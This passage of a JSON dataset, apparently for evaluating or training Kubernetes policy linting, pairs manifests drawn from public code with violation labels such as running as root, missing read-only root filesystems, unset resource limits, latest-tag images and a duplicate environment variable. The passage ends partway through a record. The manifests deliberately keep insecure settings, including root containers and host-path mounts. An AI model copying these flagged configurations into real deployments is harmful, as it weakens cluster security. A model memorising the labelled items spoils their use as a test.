    "id": "9021",
    "manifest_path": "data/manifests/the_stack_sample/sample_3395.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: run-job\n          image: node:lts-jessie\n          command:\n          - node\n          - \"\\u201Cjob.js\\u201D\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"run-job\" is not set to runAsNonRoot"
  },
  {
    "id": "9022",
    "manifest_path": "data/manifests/the_stack_sample/sample_3395.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: run-job\n          image: node:lts-jessie\n          command:\n          - node\n          - \"\\u201Cjob.js\\u201D\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"run-job\" has cpu request 0"
  },
  {
    "id": "9023",
    "manifest_path": "data/manifests/the_stack_sample/sample_3395.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: run-job\n          image: node:lts-jessie\n          command:\n          - node\n          - \"\\u201Cjob.js\\u201D\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"run-job\" has memory limit 0"
  },
  {
    "id": "9024",
    "manifest_path": "data/manifests/the_stack_sample/sample_3398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: edgex-export-distro\n  name: edgex-export-distro\nspec:\n  selector:\n    matchLabels:\n      io.kompose.service: edgex-export-distro\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        io.kompose.service: edgex-export-distro\n    spec:\n      containers:\n      - image: edgexfoundry/docker-export-distro:0.2.1\n        name: edgex-export-distro\n        ports:\n        - containerPort: 48070\n        - containerPort: 5566\n        resources: {}\n        volumeMounts:\n        - mountPath: /data/db\n          name: data-db\n        - mountPath: /edgex/logs\n          name: edgex-logs\n        - mountPath: /consul/config\n          name: consul-config\n        - mountPath: /consul/data\n          name: consul-data\n      volumes:\n      - name: data-db\n        hostPath:\n          path: /data/db\n      - name: edgex-logs\n        hostPath:\n          path: /edgex/logs\n      - name: consul-config\n        hostPath:\n          path: /consul/config\n      - name: consul-data\n        hostPath:\n          path: /consul/data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"edgex-export-distro\" does not have a read-only root file system"
  },
  {
    "id": "9025",
    "manifest_path": "data/manifests/the_stack_sample/sample_3398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: edgex-export-distro\n  name: edgex-export-distro\nspec:\n  selector:\n    matchLabels:\n      io.kompose.service: edgex-export-distro\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        io.kompose.service: edgex-export-distro\n    spec:\n      containers:\n      - image: edgexfoundry/docker-export-distro:0.2.1\n        name: edgex-export-distro\n        ports:\n        - containerPort: 48070\n        - containerPort: 5566\n        resources: {}\n        volumeMounts:\n        - mountPath: /data/db\n          name: data-db\n        - mountPath: /edgex/logs\n          name: edgex-logs\n        - mountPath: /consul/config\n          name: consul-config\n        - mountPath: /consul/data\n          name: consul-data\n      volumes:\n      - name: data-db\n        hostPath:\n          path: /data/db\n      - name: edgex-logs\n        hostPath:\n          path: /edgex/logs\n      - name: consul-config\n        hostPath:\n          path: /consul/config\n      - name: consul-data\n        hostPath:\n          path: /consul/data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"edgex-export-distro\" is not set to runAsNonRoot"
  },
  {
    "id": "9026",
    "manifest_path": "data/manifests/the_stack_sample/sample_3398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: edgex-export-distro\n  name: edgex-export-distro\nspec:\n  selector:\n    matchLabels:\n      io.kompose.service: edgex-export-distro\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        io.kompose.service: edgex-export-distro\n    spec:\n      containers:\n      - image: edgexfoundry/docker-export-distro:0.2.1\n        name: edgex-export-distro\n        ports:\n        - containerPort: 48070\n        - containerPort: 5566\n        resources: {}\n        volumeMounts:\n        - mountPath: /data/db\n          name: data-db\n        - mountPath: /edgex/logs\n          name: edgex-logs\n        - mountPath: /consul/config\n          name: consul-config\n        - mountPath: /consul/data\n          name: consul-data\n      volumes:\n      - name: data-db\n        hostPath:\n          path: /data/db\n      - name: edgex-logs\n        hostPath:\n          path: /edgex/logs\n      - name: consul-config\n        hostPath:\n          path: /consul/config\n      - name: consul-data\n        hostPath:\n          path: /consul/data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"edgex-export-distro\" has cpu request 0"
  },
  {
    "id": "9027",
    "manifest_path": "data/manifests/the_stack_sample/sample_3398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.kompose.service: edgex-export-distro\n  name: edgex-export-distro\nspec:\n  selector:\n    matchLabels:\n      io.kompose.service: edgex-export-distro\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        io.kompose.service: edgex-export-distro\n    spec:\n      containers:\n      - image: edgexfoundry/docker-export-distro:0.2.1\n        name: edgex-export-distro\n        ports:\n        - containerPort: 48070\n        - containerPort: 5566\n        resources: {}\n        volumeMounts:\n        - mountPath: /data/db\n          name: data-db\n        - mountPath: /edgex/logs\n          name: edgex-logs\n        - mountPath: /consul/config\n          name: consul-config\n        - mountPath: /consul/data\n          name: consul-data\n      volumes:\n      - name: data-db\n        hostPath:\n          path: /data/db\n      - name: edgex-logs\n        hostPath:\n          path: /edgex/logs\n      - name: consul-config\n        hostPath:\n          path: /consul/config\n      - name: consul-data\n        hostPath:\n          path: /consul/data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"edgex-export-distro\" has memory limit 0"
  },
  {
    "id": "9028",
    "manifest_path": "data/manifests/the_stack_sample/sample_3401.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: analytics-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: analytics\n  template:\n    metadata:\n      labels:\n        component: analytics\n    spec:\n      containers:\n      - name: analytics\n        image: ${DOCKER_USER}/servers:${BUILD_VERSION}\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '5672'\n        - name: EVENTSTORE_HOST\n          value: eventstore\n        - name: EVENTSTORE_PORT\n          value: '1113'\n        command:\n        - sh\n        - -c\n        - dotnet ./Adaptive.ReactiveTrader.Server.Analytics.dll config.prod.json\n        resources:\n          requests:\n            memory: 50M\n            cpu: 10m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"analytics\" does not have a read-only root file system"
  },
  {
    "id": "9029",
    "manifest_path": "data/manifests/the_stack_sample/sample_3401.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: analytics-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: analytics\n  template:\n    metadata:\n      labels:\n        component: analytics\n    spec:\n      containers:\n      - name: analytics\n        image: ${DOCKER_USER}/servers:${BUILD_VERSION}\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '5672'\n        - name: EVENTSTORE_HOST\n          value: eventstore\n        - name: EVENTSTORE_PORT\n          value: '1113'\n        command:\n        - sh\n        - -c\n        - dotnet ./Adaptive.ReactiveTrader.Server.Analytics.dll config.prod.json\n        resources:\n          requests:\n            memory: 50M\n            cpu: 10m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"analytics\" is not set to runAsNonRoot"
  },
  {
    "id": "9030",
    "manifest_path": "data/manifests/the_stack_sample/sample_3401.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: analytics-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: analytics\n  template:\n    metadata:\n      labels:\n        component: analytics\n    spec:\n      containers:\n      - name: analytics\n        image: ${DOCKER_USER}/servers:${BUILD_VERSION}\n        env:\n        - name: BROKER_HOST\n          value: broker\n        - name: BROKER_PORT\n          value: '5672'\n        - name: EVENTSTORE_HOST\n          value: eventstore\n        - name: EVENTSTORE_PORT\n          value: '1113'\n        command:\n        - sh\n        - -c\n        - dotnet ./Adaptive.ReactiveTrader.Server.Analytics.dll config.prod.json\n        resources:\n          requests:\n            memory: 50M\n            cpu: 10m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"analytics\" has memory limit 0"
  },
  {
    "id": "9031",
    "manifest_path": "data/manifests/the_stack_sample/sample_3404.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox-writer\n  namespace: default\nspec:\n  containers:\n  - image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n    name: writer\n    volumeMounts:\n    - mountPath: /data/writer\n      name: shared-vol\n      readOnly: false\n  volumes:\n  - name: shared-vol\n    hostPath:\n      path: /data\n      type: DirectoryOrCreate\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"writer\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9032",
    "manifest_path": "data/manifests/the_stack_sample/sample_3404.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox-writer\n  namespace: default\nspec:\n  containers:\n  - image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n    name: writer\n    volumeMounts:\n    - mountPath: /data/writer\n      name: shared-vol\n      readOnly: false\n  volumes:\n  - name: shared-vol\n    hostPath:\n      path: /data\n      type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"writer\" does not have a read-only root file system"
  },
  {
    "id": "9033",
    "manifest_path": "data/manifests/the_stack_sample/sample_3404.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox-writer\n  namespace: default\nspec:\n  containers:\n  - image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n    name: writer\n    volumeMounts:\n    - mountPath: /data/writer\n      name: shared-vol\n      readOnly: false\n  volumes:\n  - name: shared-vol\n    hostPath:\n      path: /data\n      type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"writer\" is not set to runAsNonRoot"
  },
  {
    "id": "9034",
    "manifest_path": "data/manifests/the_stack_sample/sample_3404.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox-writer\n  namespace: default\nspec:\n  containers:\n  - image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n    name: writer\n    volumeMounts:\n    - mountPath: /data/writer\n      name: shared-vol\n      readOnly: false\n  volumes:\n  - name: shared-vol\n    hostPath:\n      path: /data\n      type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"writer\" has cpu request 0"
  },
  {
    "id": "9035",
    "manifest_path": "data/manifests/the_stack_sample/sample_3404.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox-writer\n  namespace: default\nspec:\n  containers:\n  - image: busybox\n    command:\n    - sleep\n    - '3600'\n    imagePullPolicy: IfNotPresent\n    name: writer\n    volumeMounts:\n    - mountPath: /data/writer\n      name: shared-vol\n      readOnly: false\n  volumes:\n  - name: shared-vol\n    hostPath:\n      path: /data\n      type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"writer\" has memory limit 0"
  },
  {
    "id": "9036",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "duplicate-env-var",
    "violation_text": "Duplicate environment variable DATABASE_HOST in container \"obs\" found"
  },
  {
    "id": "9037",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9038",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"obs\" is using an invalid container image, \"adanalife/obs:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9039",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9040",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"obs\" does not have a read-only root file system"
  },
  {
    "id": "9041",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: TWITCH_CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_ID\n        - name: TWITCH_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_CLIENT_SECRET\n        - name: TWITCH_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWITCH_AUTH_TOKEN\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: SENTRY_DSN\n        - name: TRIPBOT_HTTP_AUTH\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TRIPBOT_HTTP_AUTH\n        - name: TWILIO_AUTH_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: TWILIO_AUTH_TOKEN\n        volumeMounts:\n        - name: dashcam-volume\n          mountPath: /opt/data/Dashcam/_all\n        - name: log\n          mountPath: /opt/tripbot/log\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - mountPath: /etc/nginx\n          readOnly: true\n          name: nginx-conf\n        - mountPath: /var/log/nginx\n          name: log\n      volumes:\n      - name: dashcam-volume\n        persistentVolumeClaim:\n          claimName: dashcam-from-host-claim\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n          items:\n          - key: nginx.conf\n            path: nginx.conf\n          - key: virtualhost.conf\n            path: virtualhost/virtualhost.conf\n      - name: log\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9042",
    "manifest_path": "data/manifests/the_stack_sample/sample_3405.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: obs\nspec:\n  selector:\n    matchLabels:\n      app: obs-server\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: obs-server\n    spec:\n      containers:\n      - name: obs\n        image: adanalife/obs:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 5900\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 2\n            ephemeral-storage: 1Gi\n          limits:\n            memory: 256Mi\n            cpu: 2\n        env:\n        - name: DATABASE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_HOST\n        - name: DATABASE_DB\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_DB\n        - name: DATABASE_USER\n          valueFrom:\n            secretKeyRef:\n              name: tripbot-secrets\n              key: DATABASE_USER\n        - name: 